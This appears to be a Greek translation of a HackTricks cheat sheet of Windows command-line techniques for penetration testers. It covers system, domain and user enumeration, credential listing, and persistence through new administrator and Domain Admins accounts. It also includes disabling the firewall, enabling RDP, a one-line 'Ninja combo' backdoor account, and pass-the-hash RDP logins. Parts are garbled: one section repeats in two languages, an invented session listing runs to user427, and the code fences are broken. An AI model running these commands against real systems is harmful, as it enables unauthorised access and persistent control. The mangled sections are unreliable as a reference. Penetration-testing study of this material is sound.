# Basic Win CMD for Pentesters

## Βασική εντολή CMD για Pentesters σε Windows

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Συμμετάσχετε** στην [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο** [**αποθετήριο hacktricks**](https://github.com/carlospolop/hacktricks) **και** [**αποθετήριο hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### Πληροφορίες συστήματος

#### Πληροφορίες έκδοσης και ενημερώσεων

```bash
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get architecture
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic computersystem LIST full #Get PC info

wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic qfe list brief #Updates

hostname

DRIVERQUERY #3rd party driver vulnerable?
```

#### Περιβάλλον

```bash
set #List all environment variables
```

Ορισμένες μεταβλητές περιβάλλοντος για να τονίσουμε:

* **COMPUTERNAME**: Όνομα του υπολογιστή
* **TEMP/TMP:** Φάκελος προσωρινών αρχείων
* **USERNAME:** Το όνομα χρήστη σας
* **HOMEPATH/USERPROFILE:** Κατάλογος αρχικού φακέλου
* **windir:** C:\Windows
* **OS**: Λειτουργικό σύστημα Windows
* **LOGONSERVER**: Όνομα του ελεγκτή τομέα
* **USERDNSDOMAIN**: Όνομα τομέα για χρήση με το DNS
* **USERDOMAIN**: Όνομα του τομέα

```bash
nslookup %LOGONSERVER%.%USERDNSDOMAIN% #DNS request for DC
```

#### Τοποθετημένοι δίσκοι

Οι τοποθετημένοι δίσκοι αναφέρονται στους δίσκους που έχουν συνδεθεί και είναι προσβάσιμοι από το σύστημα. Μπορείτε να ελέγξετε τους τοποθετημένους δίσκους στο παρακάτω μονοπάτι:

```cmd
wmic logicaldisk get caption, description, filesystem
```

Αυτή η εντολή θα εμφανίσει τις ετικέτες, τις περιγραφές και τα συστήματα αρχείων των τοποθετημένων δίσκων.

```bash
(wmic logicaldisk get caption 2>nul | more) || (fsutil fsinfo drives 2>nul)
wmic logicaldisk get caption,description,providername
```

#### [Προστάτης](authentication-credentials-uac-and-efs/#defender)

#### Κάδος ανακύκλωσης

```bash
dir C:\$Recycle.Bin /s /b
```

#### Διεργασίες, Υπηρεσίες & Λογισμικό

Οι διεργασίες, οι υπηρεσίες και το λογισμικό

```bash
schtasks /query /fo LIST /v #Verbose out of scheduled tasks
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
tasklist /V #List processes
tasklist /SVC #links processes to started services
net start #Windows Services started
wmic service list brief #List services
sc query #List of services
dir /a "C:\Program Files" #Installed software
dir /a "C:\Program Files (x86)" #Installed software
reg query HKEY_LOCAL_MACHINE\SOFTWARE #Installed software
```

### Πληροφορίες τομέα

```plaintext
# Get domain information
whois domain.com

# Get DNS records
nslookup domain.com

# Get MX records
nslookup -type=mx domain.com

# Get TXT records
nslookup -type=txt domain.com

# Get SPF records
nslookup -type=txt domain.com | findstr "v=spf1"

# Get DKIM records
nslookup -type=txt domain.com | findstr "v=DKIM1"

# Get DMARC records
nslookup -type=txt _dmarc.domain.com
```

Πληροφορίες τομέα

```plaintext
# Λήψη πληροφοριών τομέα
whois domain.com

# Λήψη εγγραφών DNS
nslookup domain.com

# Λήψη εγγραφών MX
nslookup -type=mx domain.com

# Λήψη εγγραφών TXT
nslookup -type=txt domain.com

# Λήψη εγγραφών SPF
nslookup -type=txt domain.com | findstr "v=spf1"

# Λήψη εγγραφών DKIM
nslookup -type=txt domain.com | findstr "v=DKIM1"

# Λήψη εγγραφών DMARC
nslookup -type=txt _dmarc.domain.com
```

```bash
# Generic AD info
echo %USERDOMAIN% #Get domain name
echo %USERDNSDOMAIN% #Get domain name
echo %logonserver% #Get name of the domain controller
set logonserver #Get name of the domain controller
set log #Get name of the domain controller
gpresult /V # Get current policy applied
wmic ntdomain list /format:list	#Displays information about the Domain and Domain Controllers

# Users
dsquery user #Get all users
net user /domain #List all users of the domain
net user <ACCOUNT_NAME> /domain #Get information about that user
net accounts /domain #Password and lockout policy
wmic useraccount list /format:list #Displays information about all local accounts and any domain accounts that have logged into the device
wmic /NAMESPACE:\\root\directory\ldap PATH ds_user GET ds_samaccountname #Get all users
wmic /NAMESPACE:\\root\directory\ldap PATH ds_user where "ds_samaccountname='user_name'" GET # Get info of 1 users
wmic sysaccount list /format:list # Dumps information about any system accounts that are being used as service accounts.

# Groups
net group /domain #List of domain groups
net localgroup administrators /domain #List uses that belongs to the administrators group inside the domain (the group "Domain Admins" is included here)
net group "Domain Admins" /domain #List users with domain admin privileges
net group "domain computers" /domain #List of PCs connected to the domain
net group "Domain Controllers" /domain #List PC accounts of domains controllers
wmic group list /format:list # Information about all local groups
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group GET ds_samaccountname #Get all groups
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group where "ds_samaccountname='Domain Admins'" Get ds_member /Value #Members of the group
wmic path win32_groupuser where (groupcomponent="win32_group.name="domain admins",domain="DOMAIN_NAME"") #Members of the group

# Computers
dsquery computer #Get all computers
net view /domain #Lis of PCs of the domain
nltest /dclist:<DOMAIN> #List domain controllers
wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname #All computers
wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_dnshostname #All computers

# Trust relations
nltest /domain_trusts #Mapping of the trust relationships

# Get all objects inside an OU
dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

#### Αρχεία καταγραφής και συμβάντα

Οι αρχείο καταγραφής (logs) και τα συμβάντα (events) αποτελούν σημαντικά εργαλεία για τους πεντεστέρς. Τα logs καταγράφουν πληροφορίες σχετικά με τις δραστηριότητες του συστήματος, ενώ τα events αναφέρονται σε συγκεκριμένες ενέργειες που έχουν λάβει χώρα.

Οι logs και τα events μπορούν να παρέχουν πολύτιμες πληροφορίες για την ανίχνευση και την ανάλυση ευπαθειών στο σύστημα. Οι πεντεστέρς μπορούν να εξετάσουν αυτά τα δεδομένα για να εντοπίσουν ενδείξεις κακόβουλων ενεργειών, ανεπιθύμητων προσπαθειών πρόσβασης ή άλλων ασφαλειακών προβλημάτων.

Οι πεντεστέρς μπορούν να χρησιμοποιήσουν εργαλεία όπως το Event Viewer για να παρακολουθήσουν τα logs και τα events σε ένα σύστημα Windows. Επίσης, μπορούν να αναζητήσουν συγκεκριμένες λέξεις-κλειδιά ή πρότυπα στα logs για να εντοπίσουν ανωμαλίες ή επιθέσεις.

Είναι σημαντικό για τους πεντεστέρς να είναι εξοικειωμένοι με την ανάλυση των logs και των events, καθώς αυτό μπορεί να τους βοηθήσει να ανακαλύψουν ευπάθειες και να προστατεύσουν το σύστημα από επιθέσεις.

```bash
#Make a security query using another credentials
wevtutil qe security /rd:true /f:text /r:helpline /u:HELPLINE\zachary /p:0987654321
```

#### Χρήστες

**Εντολές**

Για να δείτε τους χρήστες που υπάρχουν στο σύστημα, εκτελέστε την εντολή:

```plaintext
net user
```

Για να δείτε πληροφορίες για έναν συγκεκριμένο χρήστη, εκτελέστε την εντολή:

```plaintext
net user <username>
```

Για να δημιουργήσετε έναν νέο χρήστη, εκτελέστε την εντολή:

```plaintext
net user <username> <password> /add
```

Για να αλλάξετε τον κωδικό πρόσβασης ενός χρήστη, εκτελέστε την εντολή:

```plaintext
net user <username> <new_password>
```

Για να αλλάξετε το όνομα ενός χρήστη, εκτελέστε την εντολή:

```plaintext
net user <old_username> <new_username> /domain
```

Για να διαγράψετε έναν χρήστη, εκτελέστε την εντολή:

```plaintext
net user <username> /delete
```

#### Ομάδες

**Εντολές**

Για να δείτε τις ομάδες που υπάρχουν στο σύστημα, εκτελέστε την εντολή:

```plaintext
net localgroup
```

Για να δείτε τα μέλη μιας συγκεκριμένης ομάδας, εκτελέστε την εντολή:

```plaintext
net localgroup <groupname>
```

Για να προσθέσετε έναν χρήστη σε μια ομάδα, εκτελέστε την εντολή:

```plaintext
net localgroup <groupname> <username> /add
```

Για να αφαιρέσετε έναν χρήστη από μια ομάδα, εκτελέστε την εντολή:

```plaintext
net localgroup <groupname> <username> /delete
```

```bash
#Me
whoami /all #All info about me, take a look at the enabled tokens
whoami /priv #Show only privileges

# Local users
net users #All users
dir /b /ad "C:\Users"
net user %username% #Info about a user (me)
net accounts #Information about password requirements
wmic USERACCOUNT Get Domain,Name,Sid
net user /add [username] [password] #Create user

# Other users looged
qwinsta #Anyone else logged in?

#Lauch new cmd.exe with new creds (to impersonate in network)
runas /netonly /user<DOMAIN>\<NAME> "cmd.exe" ::The password will be prompted

#Check current logon session as administrator using logonsessions from sysinternals
logonsessions.exe
logonsessions64.exe
```

#### Ομάδες

Οι ομάδες στο λειτουργικό σύστημα Windows είναι συλλογές χρηστών που μοιράζονται κοινά δικαιώματα και προνόμια. Οι ομάδες χρησιμοποιούνται για την οργάνωση και τη διαχείριση των χρηστών σε ένα σύστημα. Κάθε χρήστης ανήκει σε μία ή περισσότερες ομάδες, και μπορεί να έχει δικαιώματα και προνόμια που έχουν οριστεί για αυτές τις ομάδες.

Οι ομάδες μπορούν να χρησιμοποιηθούν για την εφαρμογή πολιτικών ασφαλείας, τον περιορισμό των προνομίων χρηστών και την οργάνωση των δικαιωμάτων πρόσβασης σε αρχεία και φακέλους. Οι περισσότερες εγκατεστημένες εφαρμογές και υπηρεσίες στο σύστημα Windows έχουν τις δικές τους ομάδες χρηστών, οι οποίες χρησιμοποιούνται για την απομόνωση και την ασφάλεια των διαδικασιών.

```bash
#Local
net localgroup #All available groups
net localgroup Administrators #Info about a group (admins)
net localgroup administrators [username] /add #Add user to administrators

#Domain
net group /domain #Info about domain groups
net group /domain <domain_group_name> #Users that belongs to the group
```

To list active sessions in Windows, you can use the `query session` command. This command will display information about each active session, including the session ID, username, and session state.

```plaintext
C:\> query session
```

This will output a table with the session details, such as:

```plaintext
 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
 services                                    0  Disc
 console           Administrator             1  Active
                   user1                      2  Disc
                   user2                      3  Disc
                   user3                      4  Disc
                   user4                      5  Disc
                   user5                      6  Disc
                   user6                      7  Disc
                   user7                      8  Disc
                   user8                      9  Disc
                   user9                     10  Disc
                   user10                    11  Disc
                   user11                    12  Disc
                   user12                    13  Disc
                   user13                    14  Disc
                   user14                    15  Disc
                   user15                    16  Disc
                   user16                    17  Disc
                   user17                    18  Disc
                   user18                    19  Disc
                   user19                    20  Disc
                   user20                    21  Disc
                   user21                    22  Disc
                   user22                    23  Disc
                   user23                    24  Disc
                   user24                    25  Disc
                   user25                    26  Disc
                   user26                    27  Disc
                   user27                    28  Disc
                   user28                    29  Disc
                   user29                    30  Disc
                   user30                    31  Disc
                   user31                    32  Disc
                   user32                    33  Disc
                   user33                    34  Disc
                   user34                    35  Disc
                   user35                    36  Disc
                   user36                    37  Disc
                   user37                    38  Disc
                   user38                    39  Disc
                   user39                    40  Disc
                   user40                    41  Disc
                   user41                    42  Disc
                   user42                    43  Disc
                   user43                    44  Disc
                   user44                    45  Disc
                   user45                    46  Disc
                   user46                    47  Disc
                   user47                    48  Disc
                   user48                    49  Disc
                   user49                    50  Disc
                   user50                    51  Disc
                   user51                    52  Disc
                   user52                    53  Disc
                   user53                    54  Disc
                   user54                    55  Disc
                   user55                    56  Disc
                   user56                    57  Disc
                   user57                    58  Disc
                   user58                    59  Disc
                   user59                    60  Disc
                   user60                    61  Disc
                   user61                    62  Disc
                   user62                    63  Disc
                   user63                    64  Disc
                   user64                    65  Disc
                   user65                    66  Disc
                   user66                    67  Disc
                   user67                    68  Disc
                   user68                    69  Disc
                   user69                    70  Disc
                   user70                    71  Disc
                   user71                    72  Disc
                   user72                    73  Disc
                   user73                    74  Disc
                   user74                    75  Disc
                   user75                    76  Disc
                   user76                    77  Disc
                   user77                    78  Disc
                   user78                    79  Disc
                   user79                    80  Disc
                   user80                    81  Disc
                   user81                    82  Disc
                   user82                    83  Disc
                   user83                    84  Disc
                   user84                    85  Disc
                   user85                    86  Disc
                   user86                    87  Disc
                   user87                    88  Disc
                   user88                    89  Disc
                   user89                    90  Disc
                   user90                    91  Disc
                   user91                    92  Disc
                   user92                    93  Disc
                   user93                    94  Disc
                   user94                    95  Disc
                   user95                    96  Disc
                   user96                    97  Disc
                   user97                    98  Disc
                   user98                    99  Disc
                   user99                   100  Disc
                   user100                  101  Disc
                   user101                  102  Disc
                   user102                  103  Disc
                   user103                  104  Disc
                   user104                  105  Disc
                   user105                  106  Disc
                   user106                  107  Disc
                   user107                  108  Disc
                   user108                  109  Disc
                   user109                  110  Disc
                   user110                  111  Disc
                   user111                  112  Disc
                   user112                  113  Disc
                   user113                  114  Disc
                   user114                  115  Disc
                   user115                  116  Disc
                   user116                  117  Disc
                   user117                  118  Disc
                   user118                  119  Disc
                   user119                  120  Disc
                   user120                  121  Disc
                   user121                  122  Disc
                   user122                  123  Disc
                   user123                  124  Disc
                   user124                  125  Disc
                   user125                  126  Disc
                   user126                  127  Disc
                   user127                  128  Disc
                   user128                  129  Disc
                   user129                  130  Disc
                   user130                  131  Disc
                   user131                  132  Disc
                   user132                  133  Disc
                   user133                  134  Disc
                   user134                  135  Disc
                   user135                  136  Disc
                   user136                  137  Disc
                   user137                  138  Disc
                   user138                  139  Disc
                   user139                  140  Disc
                   user140                  141  Disc
                   user141                  142  Disc
                   user142                  143  Disc
                   user143                  144  Disc
                   user144                  145  Disc
                   user145                  146  Disc
                   user146                  147  Disc
                   user147                  148  Disc
                   user148                  149  Disc
                   user149                  150  Disc
                   user150                  151  Disc
                   user151                  152  Disc
                   user152                  153  Disc
                   user153                  154  Disc
                   user154                  155  Disc
                   user155                  156  Disc
                   user156                  157  Disc
                   user157                  158  Disc
                   user158                  159  Disc
                   user159                  160  Disc
                   user160                  161  Disc
                   user161                  162  Disc
                   user162                  163  Disc
                   user163                  164  Disc
                   user164                  165  Disc
                   user165                  166  Disc
                   user166                  167  Disc
                   user167                  168  Disc
                   user168                  169  Disc
                   user169                  170  Disc
                   user170                  171  Disc
                   user171                  172  Disc
                   user172                  173  Disc
                   user173                  174  Disc
                   user174                  175  Disc
                   user175                  176  Disc
                   user176                  177  Disc
                   user177                  178  Disc
                   user178                  179  Disc
                   user179                  180  Disc
                   user180                  181  Disc
                   user181                  182  Disc
                   user182                  183  Disc
                   user183                  184  Disc
                   user184                  185  Disc
                   user185                  186  Disc
                   user186                  187  Disc
                   user187                  188  Disc
                   user188                  189  Disc
                   user189                  190  Disc
                   user190                  191  Disc
                   user191                  192  Disc
                   user192                  193  Disc
                   user193                  194  Disc
                   user194                  195  Disc
                   user195                  196  Disc
                   user196                  197  Disc
                   user197                  198  Disc
                   user198                  199  Disc
                   user199                  200  Disc
                   user200                  201  Disc
                   user201                  202  Disc
                   user202                  203  Disc
                   user203                  204  Disc
                   user204                  205  Disc
                   user205                  206  Disc
                   user206                  207  Disc
                   user207                  208  Disc
                   user208                  209  Disc
                   user209                  210  Disc
                   user210                  211  Disc
                   user211                  212  Disc
                   user212                  213  Disc
                   user213                  214  Disc
                   user214                  215  Disc
                   user215                  216  Disc
                   user216                  217  Disc
                   user217                  218  Disc
                   user218                  219  Disc
                   user219                  220  Disc
                   user220                  221  Disc
                   user221                  222  Disc
                   user222                  223  Disc
                   user223                  224  Disc
                   user224                  225  Disc
                   user225                  226  Disc
                   user226                  227  Disc
                   user227                  228  Disc
                   user228                  229  Disc
                   user229                  230  Disc
                   user230                  231  Disc
                   user231                  232  Disc
                   user232                  233  Disc
                   user233                  234  Disc
                   user234                  235  Disc
                   user235                  236  Disc
                   user236                  237  Disc
                   user237                  238  Disc
                   user238                  239  Disc
                   user239                  240  Disc
                   user240                  241  Disc
                   user241                  242  Disc
                   user242                  243  Disc
                   user243                  244  Disc
                   user244                  245  Disc
                   user245                  246  Disc
                   user246                  247  Disc
                   user247                  248  Disc
                   user248                  249  Disc
                   user249                  250  Disc
                   user250                  251  Disc
                   user251                  252  Disc
                   user252                  253  Disc
                   user253                  254  Disc
                   user254                  255  Disc
                   user255                  256  Disc
                   user256                  257  Disc
                   user257                  258  Disc
                   user258                  259  Disc
                   user259                  260  Disc
                   user260                  261  Disc
                   user261                  262  Disc
                   user262                  263  Disc
                   user263                  264  Disc
                   user264                  265  Disc
                   user265                  266  Disc
                   user266                  267  Disc
                   user267                  268  Disc
                   user268                  269  Disc
                   user269                  270  Disc
                   user270                  271  Disc
                   user271                  272  Disc
                   user272                  273  Disc
                   user273                  274  Disc
                   user274                  275  Disc
                   user275                  276  Disc
                   user276                  277  Disc
                   user277                  278  Disc
                   user278                  279  Disc
                   user279                  280  Disc
                   user280                  281  Disc
                   user281                  282  Disc
                   user282                  283  Disc
                   user283                  284  Disc
                   user284                  285  Disc
                   user285                  286  Disc
                   user286                  287  Disc
                   user287                  288  Disc
                   user288                  289  Disc
                   user289                  290  Disc
                   user290                  291  Disc
                   user291                  292  Disc
                   user292                  293  Disc
                   user293                  294  Disc
                   user294                  295  Disc
                   user295                  296  Disc
                   user296                  297  Disc
                   user297                  298  Disc
                   user298                  299  Disc
                   user299                  300  Disc
                   user300                  301  Disc
                   user301                  302  Disc
                   user302                  303  Disc
                   user303                  304  Disc
                   user304                  305  Disc
                   user305                  306  Disc
                   user306                  307  Disc
                   user307                  308  Disc
                   user308                  309  Disc
                   user309                  310  Disc
                   user310                  311  Disc
                   user311                  312  Disc
                   user312                  313  Disc
                   user313                  314  Disc
                   user314                  315  Disc
                   user315                  316  Disc
                   user316                  317  Disc
                   user317                  318  Disc
                   user318                  319  Disc
                   user319                  320  Disc
                   user320                  321  Disc
                   user321                  322  Disc
                   user322                  323  Disc
                   user323                  324  Disc
                   user324                  325  Disc
                   user325                  326  Disc
                   user326                  327  Disc
                   user327                  328  Disc
                   user328                  329  Disc
                   user329                  330  Disc
                   user330                  331  Disc
                   user331                  332  Disc
                   user332                  333  Disc
                   user333                  334  Disc
                   user334                  335  Disc
                   user335                  336  Disc
                   user336                  337  Disc
                   user337                  338  Disc
                   user338                  339  Disc
                   user339                  340  Disc
                   user340                  341  Disc
                   user341                  342  Disc
                   user342                  343  Disc
                   user343                  344  Disc
                   user344                  345  Disc
                   user345                  346  Disc
                   user346                  347  Disc
                   user347                  348  Disc
                   user348                  349  Disc
                   user349                  350  Disc
                   user350                  351  Disc
                   user351                  352  Disc
                   user352                  353  Disc
                   user353                  354  Disc
                   user354                  355  Disc
                   user355                  356  Disc
                   user356                  357  Disc
                   user357                  358  Disc
                   user358                  359  Disc
                   user359                  360  Disc
                   user360                  361  Disc
                   user361                  362  Disc
                   user362                  363  Disc
                   user363                  364  Disc
                   user364                  365  Disc
                   user365                  366  Disc
                   user366                  367  Disc
                   user367                  368  Disc
                   user368                  369  Disc
                   user369                  370  Disc
                   user370                  371  Disc
                   user371                  372  Disc
                   user372                  373  Disc
                   user373                  374  Disc
                   user374                  375  Disc
                   user375                  376  Disc
                   user376                  377  Disc
                   user377                  378  Disc
                   user378                  379  Disc
                   user379                  380  Disc
                   user380                  381  Disc
                   user381                  382  Disc
                   user382                  383  Disc
                   user383                  384  Disc
                   user384                  385  Disc
                   user385                  386  Disc
                   user386                  387  Disc
                   user387                  388  Disc
                   user388                  389  Disc
                   user389                  390  Disc
                   user390                  391  Disc
                   user391                  392  Disc
                   user392                  393  Disc
                   user393                  394  Disc
                   user394                  395  Disc
                   user395                  396  Disc
                   user396                  397  Disc
                   user397                  398  Disc
                   user398                  399  Disc
                   user399                  400  Disc
                   user400                  401  Disc
                   user401                  402  Disc
                   user402                  403  Disc
                   user403                  404  Disc
                   user404                  405  Disc
                   user405                  406  Disc
                   user406                  407  Disc
                   user407                  408  Disc
                   user408                  409  Disc
                   user409                  410  Disc
                   user410                  411  Disc
                   user411                  412  Disc
                   user412                  413  Disc
                   user413                  414  Disc
                   user414                  415  Disc
                   user415                  416  Disc
                   user416                  417  Disc
                   user417                  418  Disc
                   user418                  419  Disc
                   user419                  420  Disc
                   user420                  421  Disc
                   user421                  422  Disc
                   user422                  423  Disc
                   user423                  424  Disc
                   user424                  425  Disc
                   user425                  426  Disc
                   user426                  427  Disc
                   user427                  428  Disc
```

qwinsta klist sessions

```
### Πολιτική Κωδικών Πρόσβασης

Η πολιτική κωδικών πρόσβασης είναι ένα σημαντικό μέτρο ασφαλείας που πρέπει να εφαρμόζεται σε ένα σύστημα. Οι παρακάτω οδηγίες παρέχουν μια βάση για τη δημιουργία μιας ισχυρής πολιτικής κωδικών πρόσβασης:

- Οι κωδικοί πρόσβασης πρέπει να είναι μακριοί και πολύπλοκοι. Χρησιμοποιήστε συνδυασμό κεφαλαίων και πεζών γραμμάτων, αριθμών και ειδικών χαρακτήρων.
- Απαιτήστε την αλλαγή κωδικού πρόσβασης σε τακτά χρονικά διαστήματα.
- Απαγορεύστε τη χρήση εύκολα μαντεύσιμων κωδικών πρόσβασης, όπως το όνομα του χρήστη ή την ημερομηνία γέννησης.
- Απαγορεύστε την επαναχρησιμοποίηση παλαιότερων κωδικών πρόσβασης.
- Ενεργοποιήστε τον αυτόματο κλείδωμα λογαριασμού μετά από πολλαπλές αποτυχημένες προσπάθειες σύνδεσης.
- Περιορίστε τον αριθμό των αποτυχημένων προσπαθειών σύνδεσης πριν από τον αυτόματο κλείδωμα του λογαριασμού.
- Απαιτήστε τη χρήση διαφορετικών κωδικών πρόσβασης για διάφορες υπηρεσίες ή λειτουργίες.
- Ενθαρρύνετε τους χρήστες να αναφέρουν αμέσως τυχόν υποψίες για διαρροή κωδικών πρόσβασης.

Ακολουθώντας αυτές τις οδηγίες, μπορείτε να δημιουργήσετε μια ισχυρή πολιτική κωδικών πρόσβασης που θα βοηθήσει στην προστασία του συστήματός σας από ανεπιθύμητη πρόσβαση.
```

net accounts

````
### Διαπιστευτήρια

Credentials are the usernames and passwords that are used to authenticate and authorize access to various systems and services. In the context of hacking, obtaining credentials is a crucial step as it allows the attacker to gain unauthorized access to a target system or network.

There are several techniques that hackers use to obtain credentials, including:

- **Phishing**: This involves tricking the target into revealing their credentials by posing as a legitimate entity, such as a bank or an email provider.

- **Brute-forcing**: In this technique, the attacker systematically tries all possible combinations of usernames and passwords until the correct credentials are found.

- **Keylogging**: Keyloggers are malicious software or hardware that record the keystrokes of a user, allowing the attacker to capture their credentials.

- **Credential stuffing**: This technique involves using a list of previously leaked credentials to try and gain access to other accounts where the user has reused the same username and password.

- **Social engineering**: This technique relies on manipulating individuals into revealing their credentials through psychological manipulation or deception.

It is important for individuals and organizations to implement strong security measures to protect their credentials, such as using unique and complex passwords, enabling multi-factor authentication, and regularly monitoring for any signs of unauthorized access.
```bash
cmdkey /list #List credential
vaultcmd /listcreds:"Windows Credentials" /all #List Windows vault
rundll32 keymgr.dll, KRShowKeyMgr #You need graphical access
````

#### Μόνιμη παραμονή με χρήστες

Η μόνιμη παραμονή είναι μια τεχνική που χρησιμοποιείται από χάκερς για να διατηρήσουν την πρόσβαση σε ένα σύστημα για μεγάλο χρονικό διάστημα. Μπορεί να επιτευχθεί με τη δημιουργία ενός νέου λογαριασμού χρήστη με δικαιώματα διαχειριστή ή με την εκμετάλλευση ενός υπάρχοντος λογαριασμού χρήστη.

Για να δημιουργήσετε ένα νέο λογαριασμό χρήστη με δικαιώματα διαχειριστή, μπορείτε να χρησιμοποιήσετε την εντολή `net user` στο παράθυρο εντολών. Για παράδειγμα, η εντολή `net user hacker password123 /add` θα δημιουργήσει ένα νέο λογαριασμό με το όνομα "hacker" και τον κωδικό πρόσβασης "password123".

Για να εκμεταλλευτείτε έναν υπάρχοντα λογαριασμό χρήστη, μπορείτε να χρησιμοποιήσετε την εντολή `net localgroup administrators hacker /add` για να προσθέσετε τον λογαριασμό "hacker" στην ομάδα διαχειριστών.

Αφού έχετε δημιουργήσει ή εκμεταλλευτεί έναν λογαριασμό χρήστη με δικαιώματα διαχειριστή, μπορείτε να χρησιμοποιήσετε αυτόν τον λογαριασμό για να διατηρήσετε την πρόσβαση στο σύστημα, ακόμα και αν οι αρχικοί λογαριασμοί χρηστών αλλάξουν ή διαγραφούν.

```bash
# Add domain user and put them in Domain Admins group
net user username password /ADD /DOMAIN
net group "Domain Admins" username /ADD /DOMAIN

# Add local user and put them local Administrators group
net user username password /ADD
net localgroup Administrators username /ADD

# Add user to insteresting groups:
net localgroup "Remote Desktop Users" UserLoginName  /add
net localgroup "Debugger users" UserLoginName /add
net localgroup "Power users" UserLoginName /add
```

### Δίκτυο

#### Διεπαφές, Διαδρομές, Θύρες, Κόμβοι και DNSCache

```bash
ipconfig /all #Info about interfaces
route print #Print available routes
arp -a #Know hosts
netstat -ano #Opened ports?
type C:\WINDOWS\System32\drivers\etc\hosts
ipconfig /displaydns | findstr "Record" | findstr "Name Host"
```

#### Τείχος Προστασίας (Firewall)

Ένα τείχος προστασίας (firewall) είναι ένα λογισμικό ή υλικού που χρησιμοποιείται για να προστατεύσει ένα δίκτυο από ανεπιθύμητη πρόσβαση. Οι τείχοι προστασίας μπορούν να περιορίσουν την εισερχόμενη και εξερχόμενη κίνηση δεδομένων, ελέγχοντας τις συνδέσεις που επιτρέπονται ή απορρίπτονται βάσει κανόνων που έχουν οριστεί.

Για να ελέγξετε την κατάσταση του τείχους προστασίας στα Windows, μπορείτε να χρησιμοποιήσετε την εντολή `netsh advfirewall show allprofiles`. Αυτή η εντολή θα εμφανίσει τις τρέχουσες ρυθμίσεις του τείχους προστασίας για όλα τα προφίλ (δημόσιο, ιδιωτικό, επιχειρησιακό).

Για να ενεργοποιήσετε ή να απενεργοποιήσετε τον τείχος προστασίας, μπορείτε να χρησιμοποιήσετε τις εντολές `netsh advfirewall set allprofiles state on` και `netsh advfirewall set allprofiles state off` αντίστοιχα.

Επιπλέον, μπορείτε να προσθέσετε ή να αφαιρέσετε εξαιρέσεις από τον τείχος προστασίας χρησιμοποιώντας τις εντολές `netsh advfirewall firewall add rule` και `netsh advfirewall firewall delete rule`. Αυτές οι εντολές σας επιτρέπουν να ορίσετε κανόνες για την επιτρεπόμενη ή απορριπτόμενη κίνηση δεδομένων με βάση την πηγή, τον προορισμό, τη θύρα και άλλα χαρακτηριστικά.

```bash
netsh firewall show state # FW info, open ports
netsh advfirewall firewall show rule name=all
netsh firewall show config # FW info
Netsh Advfirewall show allprofiles

NetSh Advfirewall set allprofiles state off  #Turn Off
NetSh Advfirewall set allprofiles state on  #Trun On
netsh firewall set opmode disable #Turn Off

#How to open ports
netsh advfirewall firewall add rule name="NetBIOS UDP Port 138" dir=out action=allow protocol=UDP localport=138
netsh advfirewall firewall add rule name="NetBIOS TCP Port 139" dir=in action=allow protocol=TCP localport=139
netsh firewall add portopening TCP 3389 "Remote Desktop"

#Enable Remote Desktop
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh firewall add portopening TCP 3389 "Remote Desktop"
::netsh firewall set service remotedesktop enable #I found that this line is not needed
::sc config TermService start= auto #I found that this line is not needed
::net start Termservice #I found that this line is not needed

#Enable Remote Desktop with wmic
wmic rdtoggle where AllowTSConnections="0" call SetAllowTSConnections "1"
##or
wmic /node:remotehost path Win32_TerminalServiceSetting where AllowTSConnections="0" call SetAllowTSConnections "1"

#Enable Remote assistance:
reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fAllowToGetHelp /t REG_DWORD /d 1 /f
netsh firewall set service remoteadmin enable

#Ninja combo (New Admin User, RDP + Rassistance + Firewall allow)
net user hacker Hacker123! /add & net localgroup administrators hacker /add & net localgroup "Remote Desktop Users" hacker /add & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f & netsh firewall add portopening TCP 3389 "Remote Desktop" & netsh firewall set service remoteadmin enable

::Connect to RDP (using hash or password)
xfreerdp /u:alice /d:WORKGROUP /pth:b74242f37e47371aff835a6ebcac4ffe /v:10.11.1.49
xfreerdp /u:hacker /d:WORKGROUP /p:Hacker123! /v:10.11.1.49
```

#### Κοινοποιήσεις

